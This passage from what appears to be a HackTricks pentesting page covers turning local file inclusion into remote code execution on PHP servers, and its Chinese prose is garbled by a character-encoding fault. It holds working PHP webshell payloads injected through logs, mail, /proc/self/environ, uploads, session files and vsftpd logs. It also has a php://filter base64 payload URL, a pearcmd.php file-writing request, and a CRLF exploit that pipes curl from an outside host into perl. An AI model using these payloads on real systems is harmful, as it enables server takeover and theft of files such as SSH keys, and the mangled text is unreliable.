<h2 id="lfi2rce"><a class="header" href="#lfi2rce">LFI2RCE</a></h2>
<h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a class="header" href="#è¿œç¨‹æ–‡ä»¶åŒ…å«">è¿œç¨‹æ–‡ä»¶åŒ…å«</a></h3>
<p>å¦‚å‰æ‰€è¿°ï¼Œ<a href="./#remote-file-inclusion"><strong>è¯·ç‚¹å‡»æ­¤é“¾æ¥</strong></a>ã€‚</p>
<h3 id="é€šè¿‡apachenginxæ—¥å¿—æ–‡ä»¶"><a class="header" href="#é€šè¿‡apachenginxæ—¥å¿—æ–‡ä»¶">é€šè¿‡Apache/Nginxæ—¥å¿—æ–‡ä»¶</a></h3>
<p>å¦‚æœApacheæˆ–NginxæœåŠ¡å™¨åœ¨åŒ…å«å‡½æ•°ä¸­<strong>æ˜“å—LFIæ”»å‡»</strong>ï¼Œæ‚¨å¯ä»¥å°è¯•è®¿é—®**<code>/var/log/apache2/access.log</code>æˆ–<code>/var/log/nginx/access.log</code><strong>ï¼Œåœ¨</strong>ç”¨æˆ·ä»£ç†<strong>æˆ–</strong>GETå‚æ•°<strong>ä¸­è®¾ç½®ä¸€ä¸ªphp shellï¼Œå¦‚</strong><code>&lt;?php system($_GET['c']); ?&gt;</code>**å¹¶åŒ…å«è¯¥æ–‡ä»¶ã€‚</p>
<p>{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨ä¸ºshellä½¿ç”¨åŒå¼•å·è€Œä¸æ˜¯<strong>å•å¼•å·</strong>ï¼ŒåŒå¼•å·å°†è¢«ä¿®æ”¹ä¸ºå­—ç¬¦ä¸²"<em><strong>quote;</strong></em>"ï¼Œ<strong>PHPå°†åœ¨é‚£é‡ŒæŠ›å‡ºé”™è¯¯</strong>ï¼Œå¹¶ä¸”<strong>ä¸ä¼šæ‰§è¡Œå…¶ä»–ä»»ä½•å†…å®¹</strong>ã€‚</p>
<p>æ­¤å¤–ï¼Œè¯·ç¡®ä¿<strong>æ­£ç¡®ç¼–å†™æœ‰æ•ˆè½½è·</strong>ï¼Œå¦åˆ™PHPæ¯æ¬¡å°è¯•åŠ è½½æ—¥å¿—æ–‡ä»¶æ—¶éƒ½ä¼šå‡ºé”™ï¼Œæ‚¨å°†æ²¡æœ‰ç¬¬äºŒæ¬¡æœºä¼šã€‚
{% endhint %}</p>
<p>è¿™ä¹Ÿå¯ä»¥åœ¨å…¶ä»–æ—¥å¿—ä¸­å®Œæˆï¼Œä½†**è¯·å°å¿ƒï¼Œ<strong>æ—¥å¿—ä¸­çš„ä»£ç å¯èƒ½è¢«URLç¼–ç ï¼Œè¿™å¯èƒ½ä¼šç ´åShellã€‚å¤´éƒ¨</strong>æˆæƒ "basic"**åŒ…å«"ç”¨æˆ·:å¯†ç "çš„Base64ç¼–ç ï¼Œå¹¶åœ¨æ—¥å¿—ä¸­è§£ç ã€‚PHPShellå¯ä»¥æ’å…¥åˆ°æ­¤å¤´éƒ¨ä¸­ã€‚<br />
å…¶ä»–å¯èƒ½çš„æ—¥å¿—è·¯å¾„ï¼š</p>
<pre><code class="language-python">/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
</code></pre>
<p>Fuzzing wordlist: <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI</a></p>
<h3 id="é€šè¿‡ç”µå­é‚®ä»¶"><a class="header" href="#é€šè¿‡ç”µå­é‚®ä»¶">é€šè¿‡ç”µå­é‚®ä»¶</a></h3>
<p><strong>å‘é€é‚®ä»¶</strong>åˆ°å†…éƒ¨è´¦æˆ· (user@localhost)ï¼ŒåŒ…å«ä½ çš„ PHP è´Ÿè½½ï¼Œå¦‚ <code>&lt;?php echo system($_REQUEST["cmd"]); ?&gt;</code>ï¼Œå¹¶å°è¯•åŒ…å«ç”¨æˆ·çš„é‚®ä»¶ï¼Œè·¯å¾„å¦‚ <strong><code>/var/mail/&lt;USERNAME&gt;</code></strong> æˆ– <strong><code>/var/spool/mail/&lt;USERNAME&gt;</code></strong></p>
<h3 id="é€šè¿‡-procfd"><a class="header" href="#é€šè¿‡-procfd">é€šè¿‡ /proc/*/fd/*</a></h3>
<ol>
<li>ä¸Šä¼ å¤§é‡çš„ shellï¼ˆä¾‹å¦‚ï¼š100ï¼‰</li>
<li>åŒ…å« <a href="http://example.com/index.php?page=/proc/$PID/fd/$FD">http://example.com/index.php?page=/proc/$PID/fd/$FD</a>ï¼Œå…¶ä¸­ $PID = è¿›ç¨‹çš„ PIDï¼ˆå¯ä»¥æš´åŠ›ç ´è§£ï¼‰ï¼Œ$FD æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¹Ÿå¯ä»¥æš´åŠ›ç ´è§£ï¼‰</li>
</ol>
<h3 id="é€šè¿‡-procselfenviron"><a class="header" href="#é€šè¿‡-procselfenviron">é€šè¿‡ /proc/self/environ</a></h3>
<p>åƒæ—¥å¿—æ–‡ä»¶ä¸€æ ·ï¼Œåœ¨ User-Agent ä¸­å‘é€è´Ÿè½½ï¼Œå®ƒå°†åæ˜ åœ¨ /proc/self/environ æ–‡ä»¶ä¸­</p>
<pre><code>GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: &lt;?=phpinfo(); ?&gt;
</code></pre>
<h3 id="é€šè¿‡ä¸Šä¼ "><a class="header" href="#é€šè¿‡ä¸Šä¼ ">é€šè¿‡ä¸Šä¼ </a></h3>
<p>å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œåªéœ€åœ¨å…¶ä¸­æ³¨å…¥ shell è´Ÿè½½ (ä¾‹å¦‚ï¼š<code>&lt;?php system($_GET['c']); ?&gt;</code>)ã€‚</p>
<pre><code>http://example.com/index.php?page=path/to/uploaded/file.png
</code></pre>
<p>ä¸ºäº†ä¿æŒæ–‡ä»¶çš„å¯è¯»æ€§ï¼Œæœ€å¥½å°†å…¶æ³¨å…¥åˆ°å›¾ç‰‡/doc/pdf çš„å…ƒæ•°æ®ä¸­ã€‚</p>
<h3 id="é€šè¿‡-zip-æ–‡ä»¶ä¸Šä¼ "><a class="header" href="#é€šè¿‡-zip-æ–‡ä»¶ä¸Šä¼ ">é€šè¿‡ ZIP æ–‡ä»¶ä¸Šä¼ </a></h3>
<p>ä¸Šä¼ ä¸€ä¸ªåŒ…å«å‹ç¼© PHP shell çš„ ZIP æ–‡ä»¶å¹¶è®¿é—®ï¼š</p>
<pre><code class="language-python">example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
</code></pre>
<h3 id="é€šè¿‡-php-ä¼šè¯"><a class="header" href="#é€šè¿‡-php-ä¼šè¯">é€šè¿‡ PHP ä¼šè¯</a></h3>
<p>æ£€æŸ¥ç½‘ç«™æ˜¯å¦ä½¿ç”¨ PHP ä¼šè¯ (PHPSESSID)</p>
<pre><code>Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
</code></pre>
<p>åœ¨ PHP ä¸­ï¼Œè¿™äº›ä¼šè¯å­˜å‚¨åœ¨ <em>/var/lib/php5/sess\</em>[PHPSESSID]_ æ–‡ä»¶ä¸­</p>
<pre><code>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
</code></pre>
<p>å°† cookie è®¾ç½®ä¸º <code>&lt;?php system('cat /etc/passwd');?&gt;</code></p>
<pre><code>login=1&amp;user=&lt;?php system("cat /etc/passwd");?&gt;&amp;pass=password&amp;lang=en_us.php
</code></pre>
<p>ä½¿ç”¨ LFI åŒ…å« PHP ä¼šè¯æ–‡ä»¶</p>
<pre><code>login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
</code></pre>
<h3 id="é€šè¿‡-ssh"><a class="header" href="#é€šè¿‡-ssh">é€šè¿‡ ssh</a></h3>
<p>å¦‚æœ ssh å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œè¯·æ£€æŸ¥æ­£åœ¨ä½¿ç”¨çš„ç”¨æˆ·ï¼ˆ/proc/self/status &amp; /etc/passwdï¼‰ï¼Œå¹¶å°è¯•è®¿é—® <strong>&lt;HOME&gt;/.ssh/id_rsa</strong></p>
<h3 id="é€šè¿‡-vsftpd-æ—¥å¿—"><a class="header" href="#é€šè¿‡-vsftpd-æ—¥å¿—"><strong>é€šè¿‡</strong> <strong>vsftpd</strong> <em><strong>æ—¥å¿—</strong></em></a></h3>
<p>FTP æœåŠ¡å™¨ vsftpd çš„æ—¥å¿—ä½äº <em><strong>/var/log/vsftpd.log</strong></em>ã€‚åœ¨å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´çš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®æš´éœ²çš„ vsftpd æœåŠ¡å™¨ï¼Œå¯ä»¥è€ƒè™‘ä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ol>
<li>åœ¨ç™»å½•è¿‡ç¨‹ä¸­å°† PHP æœ‰æ•ˆè´Ÿè½½æ³¨å…¥åˆ°ç”¨æˆ·åå­—æ®µä¸­ã€‚</li>
<li>æ³¨å…¥åï¼Œåˆ©ç”¨ LFI ä» <em><strong>/var/log/vsftpd.log</strong></em> æ£€ç´¢æœåŠ¡å™¨æ—¥å¿—ã€‚</li>
</ol>
<h3 id="é€šè¿‡-php-base64-è¿‡æ»¤å™¨ä½¿ç”¨-base64"><a class="header" href="#é€šè¿‡-php-base64-è¿‡æ»¤å™¨ä½¿ç”¨-base64">é€šè¿‡ php base64 è¿‡æ»¤å™¨ï¼ˆä½¿ç”¨ base64ï¼‰</a></h3>
<p>æ­£å¦‚ <a href="https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64">è¿™ç¯‡</a> æ–‡ç« æ‰€ç¤ºï¼ŒPHP base64 è¿‡æ»¤å™¨åªä¼šå¿½ç•¥é base64ã€‚æ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»•è¿‡æ–‡ä»¶æ‰©å±•åæ£€æŸ¥ï¼šå¦‚æœæ‚¨æä¾›ä»¥ ".php" ç»“å°¾çš„ base64ï¼Œå®ƒåªä¼šå¿½ç•¥ "." å¹¶å°† "php" é™„åŠ åˆ° base64ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ç¤ºä¾‹ï¼š</p>
<pre><code class="language-url">http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;"
</code></pre>
<h3 id="é€šè¿‡-php-è¿‡æ»¤å™¨æ— éœ€æ–‡ä»¶"><a class="header" href="#é€šè¿‡-php-è¿‡æ»¤å™¨æ— éœ€æ–‡ä»¶">é€šè¿‡ php è¿‡æ»¤å™¨ï¼ˆæ— éœ€æ–‡ä»¶ï¼‰</a></h3>
<p>è¿™ä¸ª <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d"><strong>å†™ä½œ</strong></a> è§£é‡Šäº†ä½ å¯ä»¥ä½¿ç”¨ <strong>php è¿‡æ»¤å™¨ç”Ÿæˆä»»æ„å†…å®¹</strong> ä½œä¸ºè¾“å‡ºã€‚è¿™åŸºæœ¬ä¸Šæ„å‘³ç€ä½ å¯ä»¥ <strong>ç”Ÿæˆä»»æ„çš„ php ä»£ç </strong> è¿›è¡ŒåŒ…å« <strong>è€Œæ— éœ€å°†å…¶å†™å…¥</strong> æ–‡ä»¶ã€‚</p>
<p>{% content-ref url="lfi2rce-via-php-filters.md" %}
<a href="lfi2rce-via-php-filters.html">lfi2rce-via-php-filters.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡æ®µé”™è¯¯"><a class="header" href="#é€šè¿‡æ®µé”™è¯¯">é€šè¿‡æ®µé”™è¯¯</a></h3>
<p><strong>ä¸Šä¼ </strong> ä¸€ä¸ªå°†è¢«å­˜å‚¨ä¸º <strong>ä¸´æ—¶</strong> æ–‡ä»¶åœ¨ <code>/tmp</code>ï¼Œç„¶ååœ¨ <strong>åŒä¸€è¯·æ±‚ä¸­</strong> è§¦å‘ <strong>æ®µé”™è¯¯</strong>ï¼Œç„¶å <strong>ä¸´æ—¶æ–‡ä»¶å°†ä¸ä¼šè¢«åˆ é™¤</strong>ï¼Œä½ å¯ä»¥æœç´¢å®ƒã€‚</p>
<p>{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
<a href="lfi2rce-via-segmentation-fault.html">lfi2rce-via-segmentation-fault.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡-nginx-ä¸´æ—¶æ–‡ä»¶å­˜å‚¨"><a class="header" href="#é€šè¿‡-nginx-ä¸´æ—¶æ–‡ä»¶å­˜å‚¨">é€šè¿‡ Nginx ä¸´æ—¶æ–‡ä»¶å­˜å‚¨</a></h3>
<p>å¦‚æœä½ å‘ç°äº† <strong>æœ¬åœ°æ–‡ä»¶åŒ…å«</strong> å¹¶ä¸” <strong>Nginx</strong> åœ¨ PHP å‰é¢è¿è¡Œï¼Œä½ å¯èƒ½èƒ½å¤Ÿé€šè¿‡ä»¥ä¸‹æŠ€æœ¯è·å¾— RCEï¼š</p>
<p>{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
<a href="lfi2rce-via-nginx-temp-files.html">lfi2rce-via-nginx-temp-files.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡-php_session_upload_progress"><a class="header" href="#é€šè¿‡-php_session_upload_progress">é€šè¿‡ PHP_SESSION_UPLOAD_PROGRESS</a></h3>
<p>å¦‚æœä½ å‘ç°äº† <strong>æœ¬åœ°æ–‡ä»¶åŒ…å«</strong> å³ä½¿ä½  <strong>æ²¡æœ‰ä¼šè¯</strong> å¹¶ä¸” <code>session.auto_start</code> æ˜¯ <code>Off</code>ã€‚å¦‚æœä½ åœ¨ <strong>multipart POST</strong> æ•°æ®ä¸­æä¾› <strong><code>PHP_SESSION_UPLOAD_PROGRESS</code></strong>ï¼ŒPHP å°† <strong>ä¸ºä½ å¯ç”¨ä¼šè¯</strong>ã€‚ä½ å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è·å¾— RCEï¼š</p>
<p>{% content-ref url="via-php_session_upload_progress.md" %}
<a href="via-php_session_upload_progress.html">via-php_session_upload_progress.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡-windows-ä¸­çš„ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ "><a class="header" href="#é€šè¿‡-windows-ä¸­çš„ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ ">é€šè¿‡ Windows ä¸­çš„ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ </a></h3>
<p>å¦‚æœä½ å‘ç°äº† <strong>æœ¬åœ°æ–‡ä»¶åŒ…å«</strong> å¹¶ä¸”æœåŠ¡å™¨åœ¨ <strong>Windows</strong> ä¸­è¿è¡Œï¼Œä½ å¯èƒ½ä¼šè·å¾— RCEï¼š</p>
<p>{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
<a href="lfi2rce-via-temp-file-uploads.html">lfi2rce-via-temp-file-uploads.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡-pearcmdphp--url-å‚æ•°"><a class="header" href="#é€šè¿‡-pearcmdphp--url-å‚æ•°">é€šè¿‡ <code>pearcmd.php</code> + URL å‚æ•°</a></h3>
<p>æ­£å¦‚ <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"><strong>åœ¨è¿™ç¯‡æ–‡ç« ä¸­è§£é‡Šçš„</strong></a>ï¼Œè„šæœ¬ <code>/usr/local/lib/phppearcmd.php</code> åœ¨ php docker é•œåƒä¸­é»˜è®¤å­˜åœ¨ã€‚æ­¤å¤–ï¼Œå¯ä»¥é€šè¿‡ URL å‘è„šæœ¬ä¼ é€’å‚æ•°ï¼Œå› ä¸ºå®ƒè¡¨æ˜å¦‚æœ URL å‚æ•°æ²¡æœ‰ <code>=</code>ï¼Œåˆ™åº”å°†å…¶ç”¨ä½œå‚æ•°ã€‚</p>
<p>ä»¥ä¸‹è¯·æ±‚åœ¨ <code>/tmp/hello.php</code> ä¸­åˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º <code>&lt;?=phpinfo()?&gt;</code> çš„æ–‡ä»¶ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1
</code></pre>
<p>{% endcode %}</p>
<p>ä»¥ä¸‹åˆ©ç”¨CRLFæ¼æ´è·å–RCEï¼ˆæ¥è‡ª<a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1"><strong>è¿™é‡Œ</strong></a>ï¼‰ï¼š</p>
<pre><code>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
</code></pre>
<h3 id="é€šè¿‡-phpinfo-file_uploads--on"><a class="header" href="#é€šè¿‡-phpinfo-file_uploads--on">é€šè¿‡ phpinfo() (file_uploads = on)</a></h3>
<p>å¦‚æœä½ å‘ç°äº† <strong>Local File Inclusion</strong> å¹¶ä¸”æœ‰ä¸€ä¸ªæš´éœ² <strong>phpinfo()</strong> çš„æ–‡ä»¶ï¼Œä¸” file_uploads = onï¼Œä½ å¯ä»¥è·å¾— RCEï¼š</p>
<p>{% content-ref url="lfi2rce-via-phpinfo.md" %}
<a href="lfi2rce-via-phpinfo.html">lfi2rce-via-phpinfo.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡-compresszlib--php_stream_prefer_studio--è·¯å¾„æ³„éœ²"><a class="header" href="#é€šè¿‡-compresszlib--php_stream_prefer_studio--è·¯å¾„æ³„éœ²">é€šè¿‡ compress.zlib + <code>PHP_STREAM_PREFER_STUDIO</code> + è·¯å¾„æ³„éœ²</a></h3>
<p>å¦‚æœä½ å‘ç°äº† <strong>Local File Inclusion</strong> å¹¶ä¸”ä½  <strong>å¯ä»¥æå–ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„</strong>ï¼Œä½† <strong>æœåŠ¡å™¨</strong> æ­£åœ¨ <strong>æ£€æŸ¥</strong> è¦åŒ…å«çš„ <strong>æ–‡ä»¶æ˜¯å¦æœ‰ PHP æ ‡è®°</strong>ï¼Œä½ å¯ä»¥å°è¯•é€šè¿‡è¿™ä¸ª <strong>ç«äº‰æ¡ä»¶</strong> æ¥ <strong>ç»•è¿‡è¯¥æ£€æŸ¥</strong>ï¼š</p>
<p>{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
<a href="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.html">lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡æ°¸æ’ç­‰å¾…--æš´åŠ›ç ´è§£"><a class="header" href="#é€šè¿‡æ°¸æ’ç­‰å¾…--æš´åŠ›ç ´è§£">é€šè¿‡æ°¸æ’ç­‰å¾… + æš´åŠ›ç ´è§£</a></h3>
<p>å¦‚æœä½ å¯ä»¥åˆ©ç”¨ LFI æ¥ <strong>ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶</strong> å¹¶ä½¿æœåŠ¡å™¨ <strong>æŒ‚èµ·</strong> PHP æ‰§è¡Œï¼Œä½ å¯ä»¥ <strong>åœ¨æ•°å°æ—¶å†…æš´åŠ›ç ´è§£æ–‡ä»¶å</strong> æ¥æ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶ï¼š</p>
<p>{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
<a href="lfi2rce-via-eternal-waiting.html">lfi2rce-via-eternal-waiting.md</a>
{% endcontent-ref %}</p>
<h3 id="åˆ°è‡´å‘½é”™è¯¯"><a class="header" href="#åˆ°è‡´å‘½é”™è¯¯">åˆ°è‡´å‘½é”™è¯¯</a></h3>
<p>å¦‚æœä½ åŒ…å«ä»»ä½•æ–‡ä»¶ <code>/usr/bin/phar</code>ã€<code>/usr/bin/phar7</code>ã€<code>/usr/bin/phar.phar7</code>ã€<code>/usr/bin/phar.phar</code>ã€‚ (ä½ éœ€è¦åŒ…å«åŒä¸€ä¸ªæ–‡ä»¶ 2 æ¬¡ä»¥å¼•å‘è¯¥é”™è¯¯)ã€‚</p>
<p><strong>æˆ‘ä¸çŸ¥é“è¿™æœ‰ä»€ä¹ˆç”¨ï¼Œä½†å¯èƒ½ä¼šæœ‰ç”¨ã€‚</strong><br />
å³ä½¿ä½ å¯¼è‡´ PHP è‡´å‘½é”™è¯¯ï¼Œä¸Šä¼ çš„ PHP ä¸´æ—¶æ–‡ä»¶ä¹Ÿä¼šè¢«åˆ é™¤ã€‚</p>
<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>
<h2 id="å‚è€ƒ"><a class="header" href="#å‚è€ƒ">å‚è€ƒ</a></h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal">PayloadsAllTheThings</a>\</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders">PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders</a></li>
</ul>
<p>{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>åŠ å…¥æˆ‘ä»¬</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œï¼</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/email-injections.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/file-inclusion/phar-deserialization.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/email-injections.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/file-inclusion/phar-deserialization.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
